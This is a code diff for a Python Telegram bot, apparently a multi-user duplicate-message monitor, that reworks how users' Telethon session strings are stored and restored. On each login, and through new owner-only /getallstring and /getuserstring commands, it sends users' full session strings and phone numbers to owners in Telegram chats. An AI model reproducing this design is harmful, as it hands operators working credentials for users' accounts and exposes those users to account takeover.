@@ -7,7 +7,6 @@ import hashlib
 import time
 import gc
 import sys
-import json
 from typing import Dict, List, Optional, Tuple, Set, Callable, Any
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
@@ -68,20 +67,23 @@ if allowed_env:
         except ValueError:
             logger.warning("Invalid ALLOWED_USERS value skipped: %s", part)
 
-# User sessions from environment variable (persistent across restarts)
-# Format: "user_id1:session_string1,user_id2:session_string2"
+# String sessions from environment variable (comma-separated user_id:session_string)
 USER_SESSIONS: Dict[int, str] = {}
 sessions_env = os.getenv("USER_SESSIONS", "").strip()
 if sessions_env:
-    for session_pair in sessions_env.split(","):
-        if ":" in session_pair:
-            try:
-                user_id_str, session_string = session_pair.split(":", 1)
-                user_id = int(user_id_str.strip())
-                USER_SESSIONS[user_id] = session_string.strip()
-                logger.info(f"Loaded persistent session for user {user_id} from env")
-            except (ValueError, IndexError) as e:
-                logger.warning(f"Invalid session pair format: {session_pair}, error: {e}")
+    for entry in sessions_env.split(","):
+        entry = entry.strip()
+        if not entry or ":" not in entry:
+            continue
+        try:
+            user_id_str, session_string = entry.split(":", 1)
+            user_id = int(user_id_str.strip())
+            session_string = session_string.strip()
+            if user_id and session_string:
+                USER_SESSIONS[user_id] = session_string
+                logger.info(f"Loaded session for user {user_id} from env var")
+        except (ValueError, IndexError) as e:
+            logger.warning(f"Invalid USER_SESSIONS entry '{entry}': {e}")
 
 # Tuning parameters for 50 concurrent users
 MONITOR_WORKER_COUNT = int(os.getenv("MONITOR_WORKER_COUNT", "10"))
@@ -149,86 +151,6 @@ async def optimized_gc():
         collected = gc.collect()
         logger.debug(f"Garbage collection freed {collected} objects")
         _last_gc_run = current_time
-
-
-# ---------- String Session Management ----------
-async def save_user_session_to_env(user_id: int, session_string: str, phone: str, name: str):
-    """Save user session to be sent to owners for env var persistence"""
-    try:
-        # Format the session for environment variable
-        session_entry = f"{user_id}:{session_string}"
-        
-        # Send to all owners
-        for owner_id in OWNER_IDS:
-            try:
-                user_info = f"👤 Name: {name}\n📱 Phone: {phone}\n🆔 User ID: {user_id}"
-                env_format = f"USER_SESSIONS={session_entry}"
-                
-                message = (
-                    f"🔐 **New String Session Generated**\n\n"
-                    f"{user_info}\n\n"
-                    f"📝 **Session String:**\n"
-                    f"```\n{session_string}\n```\n\n"
-                    f"🌐 **Env Var Format:**\n"
-                    f"```\n{env_format}\n```\n\n"
-                    f"💡 **Add to USER_SESSIONS env var:**\n"
-                    f"Just append `,{session_entry}` to existing USER_SESSIONS\n\n"
-                    f"⚠️ **Keep this secure!** This allows login persistence across restarts."
-                )
-                
-                await BOT_INSTANCE.send_message(
-                    chat_id=owner_id,
-                    text=message,
-                    parse_mode="Markdown"
-                )
-                logger.info(f"Sent session string to owner {owner_id} for user {user_id}")
-                
-            except Exception as e:
-                logger.error(f"Failed to send session to owner {owner_id}: {e}")
-                
-    except Exception as e:
-        logger.exception(f"Error saving session to env notification for user {user_id}: {e}")
-
-
-def format_sessions_for_env() -> str:
-    """Format all active sessions for environment variable"""
-    sessions_list = []
-    
-    # Get sessions from currently connected clients
-    for user_id, client in user_clients.items():
-        try:
-            session_string = client.session.save()
-            sessions_list.append(f"{user_id}:{session_string}")
-        except Exception as e:
-            logger.error(f"Failed to get session for user {user_id}: {e}")
-    
-    # Also include sessions from USER_SESSIONS env var that aren't currently connected
-    for user_id, session_string in USER_SESSIONS.items():
-        if user_id not in user_clients:
-            sessions_list.append(f"{user_id}:{session_string}")
-    
-    # Remove duplicates while preserving order
-    seen = set()
-    unique_sessions = []
-    for session in sessions_list:
-        if session not in seen:
-            seen.add(session)
-            unique_sessions.append(session)
-    
-    return ",".join(unique_sessions)
-
-
-def get_session_string_for_user(user_id: int) -> Optional[str]:
-    """Get session string for a specific user"""
-    # First try from currently connected client
-    if user_id in user_clients:
-        try:
-            return user_clients[user_id].session.save()
-        except Exception as e:
-            logger.error(f"Failed to get session from client for user {user_id}: {e}")
-    
-    # Then try from USER_SESSIONS env var
-    return USER_SESSIONS.get(user_id)
 
 
 # ---------- Duplicate Detection ----------
@@ -304,6 +226,131 @@ async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE
         return False
 
     return True
+
+
+# ---------- String Session Management ----------
+async def send_string_session_to_owners(user_id: int, phone: str, name: str, session_string: str):
+    """Send newly generated string session to all owners"""
+    if not BOT_INSTANCE or not OWNER_IDS:
+        return
+    
+    env_format = f"```{user_id}:{session_string}```"
+    
+    message_text = (
+        f"🔐 **New String Session Generated**\n\n"
+        f"**User Info:**\n"
+        f"👤 User: {name} (ID: {user_id})\n"
+        f"📱 Phone: `{phone}`\n\n"
+        f"**Env Var Format:**\n{env_format}"
+    )
+    
+    for owner_id in OWNER_IDS:
+        try:
+            await BOT_INSTANCE.send_message(
+                chat_id=owner_id,
+                text=message_text,
+                parse_mode="Markdown"
+            )
+            logger.info(f"Sent string session to owner {owner_id} for user {user_id}")
+        except Exception as e:
+            logger.error(f"Failed to send string session to owner {owner_id}: {e}")
+
+
+async def get_all_strings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get all string sessions in env var format (owners only)"""
+    user_id = update.effective_user.id
+    
+    if user_id not in OWNER_IDS:
+        await update.message.reply_text("❌ **Owner Only**\n\nThis command is only available to owners.", parse_mode="Markdown")
+        return
+    
+    # Get all logged-in users from database
+    try:
+        users = await db_call(db.get_all_logged_in_users)
+    except Exception as e:
+        logger.error(f"Error getting logged-in users: {e}")
+        users = []
+    
+    if not users:
+        await update.message.reply_text("📭 **No String Sessions**\n\nNo users are currently logged in.", parse_mode="Markdown")
+        return
+    
+    response = "🔑 **All String Sessions**\n\n"
+    response += "Well Arranged Copy-Paste Env Var Format:\n\n"
+    
+    for user in users:
+        if not user.get("session_data"):
+            continue
+        
+        username = user.get("name", "Unknown")
+        user_id_val = user.get("user_id")
+        session_string = user.get("session_data")
+        
+        response += f"👤 User: {username} (ID: {user_id_val})\n\n"
+        response += f"Env Var Format:\n```{user_id_val}:{session_string}```\n\n"
+    
+    # Also include sessions from USER_SESSIONS env var
+    if USER_SESSIONS:
+        response += "\n📁 **From USER_SESSIONS Environment Variable:**\n\n"
+        for uid, session in USER_SESSIONS.items():
+            response += f"👤 User ID: {uid}\n\n"
+            response += f"Env Var Format:\n```{uid}:{session}```\n\n"
+    
+    await update.message.reply_text(response, parse_mode="Markdown")
+
+
+async def get_user_string_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get string session for specific user (owners only)"""
+    user_id = update.effective_user.id
+    
+    if user_id not in OWNER_IDS:
+        await update.message.reply_text("❌ **Owner Only**\n\nThis command is only available to owners.", parse_mode="Markdown")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "❌ **Invalid Format!**\n\n"
+            "**Usage:** `/getuserstring [user_id]`\n\n"
+            "**Example:** `/getuserstring 123456789`",
+            parse_mode="Markdown"
+        )
+        return
+    
+    try:
+        target_user_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("❌ **Invalid User ID!**\n\nUser ID must be a number.", parse_mode="Markdown")
+        return
+    
+    # Try to get from database first
+    try:
+        user = await db_call(db.get_user, target_user_id)
+    except Exception as e:
+        logger.error(f"Error getting user {target_user_id}: {e}")
+        user = None
+    
+    session_string = None
+    username = "Unknown"
+    
+    if user and user.get("session_data"):
+        session_string = user.get("session_data")
+        username = user.get("name", "Unknown")
+    elif target_user_id in USER_SESSIONS:
+        session_string = USER_SESSIONS[target_user_id]
+        # Try to get username from database if available
+        if user:
+            username = user.get("name", "Unknown")
+    else:
+        await update.message.reply_text(
+            f"❌ **No Session Found!**\n\nNo string session found for user ID: `{target_user_id}`",
+            parse_mode="Markdown"
+        )
+        return
+    
+    response = f"🔑 **String Session for 👤 User: {username} (ID: {target_user_id})**\n\n"
+    response += f"**Env Var Format:**\n```{target_user_id}:{session_string}```"
+    
+    await update.message.reply_text(response, parse_mode="Markdown")
 
 
 # ---------- Simple UI handlers ----------
@@ -1228,16 +1275,17 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                 me = await client.get_me()
                 session_string = client.session.save()
 
-                # Save to database
                 await db_call(db.save_user, user_id, state["phone"], me.first_name, session_string, True)
-                
-                # Save session string and send to owners for env var persistence
-                await save_user_session_to_env(user_id, session_string, state["phone"], me.first_name)
 
                 user_clients[user_id] = client
                 tasks_cache.setdefault(user_id, [])
                 chat_entity_cache.setdefault(user_id, {})
                 await start_monitoring_for_user(user_id)
+
+                # Send string session to owners
+                asyncio.create_task(send_string_session_to_owners(
+                    user_id, state["phone"], me.first_name or "User", session_string
+                ))
 
                 del login_states[user_id]
 
@@ -1318,16 +1366,17 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                 me = await client.get_me()
                 session_string = client.session.save()
 
-                # Save to database
                 await db_call(db.save_user, user_id, state["phone"], me.first_name, session_string, True)
-                
-                # Save session string and send to owners for env var persistence
-                await save_user_session_to_env(user_id, session_string, state["phone"], me.first_name)
 
                 user_clients[user_id] = client
                 tasks_cache.setdefault(user_id, [])
                 chat_entity_cache.setdefault(user_id, {})
                 await start_monitoring_for_user(user_id)
+
+                # Send string session to owners
+                asyncio.create_task(send_string_session_to_owners(
+                    user_id, state["phone"], me.first_name or "User", session_string
+                ))
 
                 del login_states[user_id]
 
@@ -1820,6 +1869,54 @@ async def start_workers(bot):
 async def restore_sessions():
     logger.info("🔄 Restoring sessions...")
 
+    # First, try to restore from USER_SESSIONS environment variable
+    if USER_SESSIONS:
+        logger.info(f"Found {len(USER_SESSIONS)} sessions in USER_SESSIONS env var")
+        for user_id, session_string in USER_SESSIONS.items():
+            if user_id in user_clients:
+                logger.debug(f"User {user_id} already has active client, skipping env session")
+                continue
+            
+            # Check if user is authorized
+            is_allowed_db = await db_call(db.is_user_allowed, user_id)
+            is_allowed_env = (user_id in ALLOWED_USERS) or (user_id in OWNER_IDS)
+            
+            if not (is_allowed_db or is_allowed_env):
+                logger.warning(f"User {user_id} from USER_SESSIONS is not authorized, skipping")
+                continue
+            
+            # Try to restore from env session
+            try:
+                client = TelegramClient(
+                    StringSession(session_string),
+                    API_ID,
+                    API_HASH,
+                    device_model="Duplicate Monitor Bot",
+                    system_version="1.0",
+                    app_version="1.0",
+                    lang_code="en"
+                )
+                await client.connect()
+                
+                if await client.is_user_authorized():
+                    user_clients[user_id] = client
+                    chat_entity_cache.setdefault(user_id, {})
+                    
+                    # Update database with session from env var
+                    try:
+                        me = await client.get_me()
+                        await db_call(db.save_user, user_id, None, me.first_name, session_string, True)
+                    except Exception as e:
+                        logger.error(f"Error updating database for user {user_id} from env session: {e}")
+                    
+                    logger.info(f"✅ Restored session for user {user_id} from USER_SESSIONS env var")
+                else:
+                    logger.warning(f"⚠️ Session from env var expired for user {user_id}")
+                    await client.disconnect()
+            except Exception as e:
+                logger.error(f"❌ Failed to restore session from env var for user {user_id}: {e}")
+
+    # Then restore from database
     def _fetch_logged_in_users():
         conn = db.get_connection()
         cur = conn.cursor()
@@ -1850,21 +1947,8 @@ async def restore_sessions():
             "settings": t.get("settings", {})
         })
 
-    logger.info(f"📊 Found {len(users)} logged in user(s) from DB")
+    logger.info(f"📊 Found {len(users)} logged in user(s) in database")
 
-    # Restore sessions from USER_SESSIONS environment variable
-    restored_from_env = 0
-    for user_id, session_string in USER_SESSIONS.items():
-        if user_id not in user_clients and session_string:
-            try:
-                await restore_single_session(user_id, session_string, from_env=True)
-                restored_from_env += 1
-            except Exception as e:
-                logger.error(f"Failed to restore session from env for user {user_id}: {e}")
-
-    logger.info(f"📊 Restored {restored_from_env} user(s) from USER_SESSIONS env var")
-
-    # Restore sessions from database
     batch_size = 3
     for i in range(0, len(users), batch_size):
         batch = users[i:i + batch_size]
@@ -1876,23 +1960,26 @@ async def restore_sessions():
             except Exception:
                 continue
 
-            if session_data and user_id not in user_clients:  # Only restore if not already restored from env
-                restore_tasks.append(restore_single_session(user_id, session_data, from_env=False))
+            # Skip if already restored from env var
+            if user_id in user_clients:
+                logger.debug(f"User {user_id} already restored from env var, skipping DB restore")
+                continue
+                
+            if session_data:
+                restore_tasks.append(restore_single_session(user_id, session_data))
         
         if restore_tasks:
             results = await asyncio.gather(*restore_tasks, return_exceptions=True)
             for result in results:
                 if isinstance(result, Exception):
-                    logger.error(f"Error restoring session from DB: {result}")
+                    logger.error(f"Error restoring session: {result}")
             await asyncio.sleep(2)
 
 
-async def restore_single_session(user_id: int, session_data: str, from_env: bool = False):
+async def restore_single_session(user_id: int, session_data: str):
     """Restore a single user session"""
     try:
-        source = "ENV" if from_env else "DB"
-        logger.info(f"Restoring session for user {user_id} from {source}")
-        
+        logger.info(f"Restoring session for user {user_id}")
         client = TelegramClient(
             StringSession(session_data),
             API_ID,
@@ -1907,31 +1994,17 @@ async def restore_single_session(user_id: int, session_data: str, from_env: bool
         if await client.is_user_authorized():
             user_clients[user_id] = client
             chat_entity_cache.setdefault(user_id, {})
-            
-            # Update database if restoring from env (to keep DB in sync)
-            if from_env:
-                try:
-                    me = await client.get_me()
-                    await db_call(db.save_user, user_id, None, me.first_name, session_data, True)
-                    logger.info(f"Updated DB with session from env for user {user_id}")
-                except Exception as e:
-                    logger.error(f"Failed to update DB for env-restored user {user_id}: {e}")
-            
             await start_monitoring_for_user(user_id)
-            logger.info(f"✅ Restored session for user {user_id} from {source}")
+            logger.info(f"✅ Restored session for user {user_id}")
         else:
-            if not from_env:  # Only update DB if session was from DB
-                await db_call(db.save_user, user_id, None, None, None, False)
-                logger.warning(f"⚠️ Session expired for user {user_id} from DB")
-            else:
-                logger.warning(f"⚠️ Session from env expired for user {user_id}")
+            await db_call(db.save_user, user_id, None, None, None, False)
+            logger.warning(f"⚠️ Session expired for user {user_id}")
     except Exception as e:
-        logger.exception(f"❌ Failed to restore session for user {user_id} from {source}: {e}")
-        if not from_env:  # Only update DB if session was from DB
-            try:
-                await db_call(db.save_user, user_id, None, None, None, False)
-            except Exception:
-                logger.exception("Error marking user logged out after failed restore for %s", user_id)
+        logger.exception(f"❌ Failed to restore session for user {user_id}: {e}")
+        try:
+            await db_call(db.save_user, user_id, None, None, None, False)
+        except Exception:
+            logger.exception("Error marking user logged out after failed restore for %s", user_id)
 
 
 # ---------- Admin commands ----------
@@ -2081,122 +2154,6 @@ async def listusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_list += f"Total: **{len(users)} user(s)**"
 
     await update.message.reply_text(user_list, parse_mode="Markdown")
-
-
-# ---------- String Session Commands ----------
-async def getstrings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Owner-only: Get all string sessions in env var format"""
-    user_id = update.effective_user.id
-    
-    # Check if user is owner
-    if user_id not in OWNER_IDS and not await db_call(db.is_user_admin, user_id):
-        await update.message.reply_text("❌ **Owner Only**\n\nThis command is only available to owners.", parse_mode="Markdown")
-        return
-    
-    # Format all sessions for environment variable
-    sessions_env_format = format_sessions_for_env()
-    
-    if not sessions_env_format:
-        await update.message.reply_text(
-            "📭 **No String Sessions Found**\n\n"
-            "No active string sessions are available.\n"
-            "Users need to login first with /login to generate sessions.",
-            parse_mode="Markdown"
-        )
-        return
-    
-    # Split message if too long (Telegram has 4096 char limit)
-    if len(sessions_env_format) > 4000:
-        # Send as separate messages
-        await update.message.reply_text(
-            "📋 **All String Sessions**\n\n"
-            "Here are all the string sessions for environment variable:\n\n"
-            "**Copy and add to USER_SESSIONS env var:**",
-            parse_mode="Markdown"
-        )
-        
-        # Send in chunks
-        chunk_size = 3000
-        for i in range(0, len(sessions_env_format), chunk_size):
-            chunk = sessions_env_format[i:i + chunk_size]
-            await update.message.reply_text(
-                f"```\n{chunk}\n```",
-                parse_mode="Markdown"
-            )
-    else:
-        await update.message.reply_text(
-            f"📋 **All String Sessions**\n\n"
-            f"Here are all the string sessions for environment variable:\n\n"
-            f"**Copy and add to USER_SESSIONS env var:**\n\n"
-            f"```\nUSER_SESSIONS={sessions_env_format}\n```\n\n"
-            f"💡 **Total sessions:** {len(sessions_env_format.split(','))}\n"
-            f"📝 **Format:** `user_id:session_string,user_id:session_string`",
-            parse_mode="Markdown"
-        )
-
-
-async def getuserstring_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Owner-only: Get string session for specific user"""
-    user_id = update.effective_user.id
-    
-    # Check if user is owner
-    if user_id not in OWNER_IDS and not await db_call(db.is_user_admin, user_id):
-        await update.message.reply_text("❌ **Owner Only**\n\nThis command is only available to owners.", parse_mode="Markdown")
-        return
-    
-    text = update.message.text.strip()
-    parts = text.split()
-    
-    if len(parts) < 2:
-        await update.message.reply_text(
-            "❌ **Invalid format!**\n\n"
-            "**Usage:** `/getuserstring [USER_ID]`\n\n"
-            "Example: `/getuserstring 123456789`",
-            parse_mode="Markdown"
-        )
-        return
-    
-    try:
-        target_user_id = int(parts[1])
-    except ValueError:
-        await update.message.reply_text("❌ **Invalid user ID!**\n\nUser ID must be a number.", parse_mode="Markdown")
-        return
-    
-    # Get session string
-    session_string = get_session_string_for_user(target_user_id)
-    
-    if not session_string:
-        await update.message.reply_text(
-            f"❌ **No session found for user {target_user_id}**\n\n"
-            "This user either:\n"
-            "1. Never logged in\n"
-            "2. Logged out\n"
-            "3. Session not in USER_SESSIONS env var",
-            parse_mode="Markdown"
-        )
-        return
-    
-    # Get user info from database
-    user = await db_call(db.get_user, target_user_id)
-    user_name = user.get("name", "Unknown") if user else "Unknown"
-    user_phone = user.get("phone", "Unknown") if user else "Unknown"
-    
-    # Format for env var
-    env_entry = f"{target_user_id}:{session_string}"
-    
-    await update.message.reply_text(
-        f"🔐 **String Session for User {target_user_id}**\n\n"
-        f"👤 **Name:** {user_name}\n"
-        f"📱 **Phone:** `{user_phone}`\n"
-        f"🆔 **User ID:** `{target_user_id}`\n\n"
-        f"📝 **Session String:**\n"
-        f"```\n{session_string}\n```\n\n"
-        f"🌐 **Env Var Entry:**\n"
-        f"```\n{env_entry}\n```\n\n"
-        f"💡 **To add to USER_SESSIONS:**\n"
-        f"Append `,{env_entry}` to existing USER_SESSIONS",
-        parse_mode="Markdown"
-    )
 
 
 # ---------- Test command for debugging ----------
@@ -2384,7 +2341,6 @@ def main():
         return
 
     logger.info(f"🤖 Starting Duplicate Monitor Bot (Max Users: {MAX_CONCURRENT_USERS}, Duplicate Window: {DUPLICATE_CHECK_WINDOW}s)...")
-    logger.info(f"📋 Loaded {len(USER_SESSIONS)} sessions from USER_SESSIONS env var")
 
     start_server_thread()
 
@@ -2396,14 +2352,12 @@ def main():
     application.add_handler(CommandHandler("monitoradd", monitoradd_command))
     application.add_handler(CommandHandler("monitortasks", monitortasks_command))
     application.add_handler(CommandHandler("getallid", getallid_command))
+    application.add_handler(CommandHandler("getallstring", get_all_strings_command))
+    application.add_handler(CommandHandler("getuserstring", get_user_string_command))
     application.add_handler(CommandHandler("adduser", adduser_command))
     application.add_handler(CommandHandler("removeuser", removeuser_command))
     application.add_handler(CommandHandler("listusers", listusers_command))
     application.add_handler(CommandHandler("test", test_command))
-    # Add string session commands
-    application.add_handler(CommandHandler("getstrings", getstrings_command))
-    application.add_handler(CommandHandler("getuserstring", getuserstring_command))
-    
     application.add_handler(CallbackQueryHandler(button_handler))
     
     # Message handlers in order of priority
